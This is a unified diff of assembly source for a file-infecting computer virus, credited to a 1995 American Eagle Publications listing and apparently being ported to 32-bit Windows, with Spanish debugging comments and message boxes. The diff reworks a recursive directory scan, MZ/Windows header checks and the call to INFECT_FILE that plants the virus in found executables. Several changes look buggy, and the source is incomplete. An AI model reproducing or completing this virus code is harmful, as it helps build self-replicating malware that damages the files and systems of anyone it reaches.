@@ -3,7 +3,7 @@
 ;(C) 1995 American Eagle Publications, Inc. All rights reserved.
 format PE console
 entry  VIRUS
-include 'win32a.inc'
+include 'win32ax.inc'
 ;Useful constants
 DATABUF_SIZE EQU 4096 ;size of read/write buf
 NEW_HDR_SIZE EQU 40H ;size of new EXE header
@@ -22,46 +22,47 @@ section '.text' code readable executable
 
 
 VIRUS:
- invoke  MessageBoxA, HWND_DESKTOP,VIRUSM, VIRUSM, MB_OK
+
+ invoke  MessageBoxA, HWND_DESKTOP,VIRUSM,notify_msg, MB_OK
+
  call CREATE_DS ;create the data segment
  ; Check for error
  test eax, eax
  jz error_exit
- invoke  MessageBoxA, HWND_DESKTOP,CREATE_DS_MSG, NOTIFY_MSG, MB_OK
+
+ invoke  MessageBoxA, HWND_DESKTOP,CREATE_DS_MSG, notify_msg, MB_OK
  ; Store memory handle
  mov [MEM_HANDLE], eax
 
 
  call VIR_START ;find starting offset of virus
  VIR_START:
-  pop si
+
+  pop esi
   sub esi,VIR_START
   mov dword[VSTART],esi
 
   call INIT_DS
+
+
   ; Mostrar el mensaje utilizando MessageBoxA
   invoke MessageBoxA, 0, [allocated_memory],notify_msg, MB_OK
-  invoke  MessageBoxA, HWND_DESKTOP,INIT_DS_MSG, NOTIFY_MSG, MB_OK
-  ; Liberar la memoria reservada
- ; call DESTROY_DS ;create the data segment
- ; invoke  MessageBoxA, HWND_DESKTOP,EXIT_MSG,NOTIFY_MSG, MB_OK
-  ; Salir del programa
- ; invoke ExitProcess, 0
-; call FIND_FILE ;find a viable file to infect
- stdcall scan_dir, _allfiles
+  invoke  MessageBoxA, HWND_DESKTOP,INIT_DS_MSG,notify_msg, MB_OK
 
- jc  common_error
+  stdcall scan_dir, _allfiles
 
- jnz SHORT GOTO_HOST ;z set if a file was found
-  invoke  MessageBoxA, HWND_DESKTOP,INFECT_FILEM, INFECT_FILEM, MB_OK
- call INFECT_FILE ;infect it if found
-; jc  common_error
+  jc  common_error
+
+  jnz SHORT GOTO_HOST ;z set if a file was found
+  invoke  MessageBoxA, HWND_DESKTOP,INFECT_FILEM, notify_msg, MB_OK
+  call INFECT_FILE ;infect it if found
+
 GOTO_HOST:
  invoke  MessageBoxA, HWND_DESKTOP,DESTROY_DSM, DESTROY_DSM, MB_OK
  call DESTROY_DS ;clean up memory
  pop es
  pop ds
- pop bp
+ pop ebp
  pop edi
  pop esi
  pop edx
@@ -90,14 +91,15 @@ ERROR_CREATE_DS:
    invoke  MessageBoxA, HWND_DESKTOP,ERROR_CREATE_DSM, ERROR_CREATE_DSM, MB_OK
 
  ret
-CFILE_ID1 DB '*.EXE',0
-CFILE_ID2 DB '*.DLL',0
-CKNAME DB 'KERNEL'
+;CFILE_ID1 DB '*.EXE',0
+;CFILE_ID2 DB '*.DLL',0
+;CKNAME DB 'KERNEL'
+
 ;Initialize data in data segment.
  INIT_DS:
 
    ; Escribir un mensaje en la memoria reservada
-    mov ecx, [allocated_memory]
+    mov ecx, dword[allocated_memory]
     mov edx, message
     call copy_string_to_memory
     ret
@@ -119,6 +121,7 @@ CKNAME DB 'KERNEL'
     invoke ExitProcess, 1
 
     copy_string_to_memory:
+
     ; Procedimiento para copiar una cadena a la memoria
     push ebx
     push esi
@@ -141,37 +144,42 @@ CKNAME DB 'KERNEL'
     pop edi
     pop esi
     pop ebx
+
+
     ret
 
-;This routine frees the memory allocated by CREATE_DS.
-DESTROY_DS:
+   ;This routine frees the memory allocated by CREATE_DS.
+   DESTROY_DS:
+
     ; Liberar la memoria reservada
     invoke VirtualFree, [allocated_memory], 0, MEM_RELEASE
- ret
+    ret
 ;******************************************************************************
 ;This routine searches for a file to infect. It looks for EXE files and then
 ;checks them to see if they’re uninfected, infectable Windows files. If a file
 ;is found, this routine returns with Z set, with the file left open, and its
 ;handle in the bx register. This FIND_FILE searches only the current directory.
 
-scan_dir:       push    ebp
-                mov     ebp, esp
-define file_mask ebp+8
-; start directory scan (subdirectory too)
-find_first:     push    ebx                             ; save caller ebx/handle
-                invoke  FindFirstFileA, [file_mask], wfd
+scan_dir:
+
+ push    ebp
+ mov     ebp, esp
+ define file_mask ebp+8
+ ; start directory scan (subdirectory too)
+ find_first:     push    ebx                             ; save caller ebx/handle
+                invoke  FindFirstFileA, dword[file_mask], wfd
                 cmp     eax, INVALID_HANDLE_VALUE
                 je      step_back                       ; no files, return to prev. dir
                 mov     ebx, eax
-output:         cinvoke printf, _fmt, [wfd.dwFileAttributes], wfd.cFileName
+ output:         cinvoke printf, _fmt, [wfd.dwFileAttributes], wfd.cFileName
 
                 mov     eax, [wfd.dwFileAttributes]
                 test    eax, FILE_ATTRIBUTE_DIRECTORY
                 jnz next
-                CALL FILE_OK
+                call FILE_OK
                 jmp find_next ; not directory, continue scan
                 next:
-FILE_ATTRIBUTE_REPARSE_POINT = 0x400
+ FILE_ATTRIBUTE_REPARSE_POINT = 0x400
                 test    eax, FILE_ATTRIBUTE_REPARSE_POINT
                 jnz     find_next                       ; symbolic link, continue scan
                 mov     eax, dword[wfd.cFileName]
@@ -187,12 +195,12 @@ find_next:      invoke  FindNextFileA, ebx, wfd
                 test    eax, eax
                 jnz     output
                 invoke  FindClose, ebx
-step_back:      pop     ebx                             ; dir scanned, restore handle/caller ebx
+ step_back:      pop     ebx                             ; dir scanned, restore handle/caller ebx
                 cmp     esp, ebp
                 jnb     done                            ; no more ebx on stack, done
                 invoke  SetCurrentDirectory, _updir     ; ascend one dir level up
                 jmp     find_next
-done:           pop     ebp
+  done:         pop     ebp
                 retn    4
 
 
@@ -211,62 +219,24 @@ FILE_OK:
 
 
         ; Copiar el nombre de archivo de la estructura wfd a FilePath
-     ;   mov esi, wfd.cFileName  ; Puntero al nombre de archivo en la estructura wfd
-     ;   mov edi, FilePath       ; Puntero al destino FilePath
-     ;   xor ecx, ecx            ; Contador de bucle
+        mov esi, wfd.cFileName  ; Puntero al nombre de archivo en la estructura wfd
+        mov edi, FilePath       ; Puntero al destino FilePath
+        xor ecx, ecx            ; Contador de bucle
 
-  ;  copy_loop:
-   ;     mov al, [esi + ecx]    ; Obtener el byte actual del nombre de archivo
-   ;     mov [edi + ecx], al    ; Copiar el byte al destino FilePath
-    ;    inc ecx                ; Incrementar el contador de bucle
-     ;   cmp al, 0              ; Comprobar si hemos alcanzado el final de la cadena
-      ;  jnz copy_loop          ; Si no, continuar copiando
-
-    ROPEN: invoke fopen, FilePath,"r"
-       invoke  MessageBoxA, HWND_DESKTOP,next_msg , notify_msg, MB_OK
-    test eax, eax
-    jz FOK_ERROR2
-
-    mov ebx, eax ; Guardar el puntero al archivo en ebx
-
-    ; Leer del archivo
-   ; call ReadFromFile
-
-    ; Inicializar el puntero al búfer
-    mov edi, NEW_HDR
-     mov ecx,40h
-.read_loop:
+    copy_loop:
+        mov al, [esi + ecx]    ; Obtener el byte actual del nombre de archivo
+        mov [edi + ecx], al    ; Copiar el byte al destino FilePath
+        inc ecx                ; Incrementar el contador de bucle
+        cmp al, 0              ; Comprobar si hemos alcanzado el final de la cadena
+        jnz copy_loop          ; Si no, continuar copiando
 
 
-    ; Leer un byte del archivo
-    invoke fgetc, ebx
-     cmp eax, -1
-    je .end_of_file
-      cmp ecx, 0
-    je .end_of_file
-    ; Almacenar el byte en el búfer
-    mov [edi], al
-    inc edi
-    dec ecx
-    ; Repetir el proceso hasta alcanzar el final del archivo
-    jmp .read_loop
-
-.end_of_file:
-    ; Colocar el terminador de cadena en el último byte del búfer
-    mov byte [edi], 0
-
-       ; Imprimir el contenido leído
-     invoke MessageBoxA, HWND_DESKTOP,NEW_HDR ,notify_msg, MB_OK
-    ; Cerrar el archivo
-    invoke fclose, ebx
-
-
-FOK1: mov ebx,eax ;open ok, put handle in bx
- mov edx, NEW_HDR ;ds:dx points to header buffer
+  FOK1: mov ebx,eax ;open ok, put handle in bx
+  mov edx, NEW_HDR ;ds:dx points to header buffer
 
  call FILE_READ ;ok, read EXE header
-
- cmp DWORD  [NEW_HDR],5A4DH;see if first 2 bytes are ’MZ’
+ invoke MessageBoxA, HWND_DESKTOP,next_msg ,notify_msg, MB_OK
+ cmp dword [NEW_HDR],5A4DH;see if first 2 bytes are ’MZ’
  jnz SHORT FN1 ;nope, file not an EXE, exit
  cmp DWORD [NEW_HDR+18H],40H ;see if rel tbl at 40H or more
  jc SHORT FN1 ;nope, it can’t be a Windows EXE
@@ -325,9 +295,56 @@ FOK4: xor al,al ;set Z flag
  ret ;and exit
 
 FILE_READ:
+
+ invoke  MessageBoxA, HWND_DESKTOP,FilePath , notify_msg, MB_OK
+ ROPEN: invoke fopen, FilePath,"r"
+
+ cmp eax,0
+ je FOK_ERROR2
+
+
    mov ebx, eax ; Guardar el puntero al archivo en ebx
+   ; Inicializar el puntero al búfer
+
+    mov edi, NEW_HDR
+   mov ecx,40h
+
+  .read_loop:
+
+
+    ; Leer un byte del archivo
+    invoke fgetc, ebx
+
+     cmp byte [ebx], -1
+    je end_of_file
+
+      cmp ecx, 0
+    je end_of_file
+
+    ; Almacenar el byte en el búfer
+    mov dword[edi], eax
+
+    inc edi
+    dec cl
+
+    ; Repetir el proceso hasta alcanzar el final del archivo
+    jmp .read_loop
+
+  end_of_file:
+
+    ; Colocar el terminador de cadena en el último byte del búfer
+     mov byte [edi], 0
+       ; Imprimir el contenido leído
+     invoke MessageBoxA, HWND_DESKTOP,NEW_HDR ,notify_msg, MB_OK
+     invoke MessageBoxA, HWND_DESKTOP,next_msg ,notify_msg, MB_OK
+    ret
+
+
+
+
+
 ;mov edx, NEW_HDR ;ds:dx points to header buffer
- mov ecx,40H ;read 40H bytes
+; mov ecx,40H ;read 40H bytes
 
 ; push es
 ; push ebx ;preserve bx through this call
@@ -337,47 +354,11 @@ FILE_READ:
 ; push ecx ;bytes to read
 ;call ReadFile
 
-
-
-  ; Inicializar el puntero al búfer
-    mov edi, NEW_HDR
-
-RREAD:
-
- .read_loop:
-
-
-    ; Leer un byte del archivo
-    invoke fgetc, ebx
-
-        cmp eax,-1
-    je .end_of_file
-
-     cmp ecx,0
-    je .end_of_file
-
-    ; Almacenar el byte en el búfer
-    mov [edi], al
-    inc edi
-    ; Repetir el proceso hasta alcanzar el final del archivo
-    dec ecx
-    jmp .read_loop
-
-.end_of_file:
-    ; Colocar el terminador de cadena en el último byte del búfer
-    mov byte [edi], 0
-
-       ; Imprimir el contenido leído
-     invoke MessageBoxA, HWND_DESKTOP, NEW_HDR ,notify_msg, MB_OK
-    ; Cerrar el archivo
-    invoke fclose, ebx
-
-
-
 ; DB 09AH ;call far ptr _lread
 ;RREAD: DW 0FFFFH,0
 ; pop ebx
  ;pop es
+  invoke MessageBoxA, HWND_DESKTOP, NEW_HDR ,notify_msg, MB_OK
  ret
 ;******************************************************************************
 ;This routine modifies the file we found to put the virus in it. There are a
@@ -928,7 +909,7 @@ exit_program:
 ;code seegment in order for the patch program to work properly.
 ARELOCS DD 5 ;number of relocatables to add
 R_OPEN DD 103H, ROPEN+1,1,85 ;relocatables table
-R_READ DD 103H, RREAD+1,1,82
+;R_READ DD 103H, RREAD+1,1,82
 
 R_WRITE DD 103H, RWRITE+1,1,86
 R_SEEK DD 103H, RSEEK+1,1,84
@@ -1002,7 +983,7 @@ _updir          TCHAR   "..", 0
 _fmt            TCHAR   "%8x %.260s", 10, 0
                 align   4
 
-   FilePath db "abcdin.exe",0; 265 dup (0) ,0
+   FilePath db  265 dup (0) ,0
    mode db "r", 0
 section '.rdata' readable
 
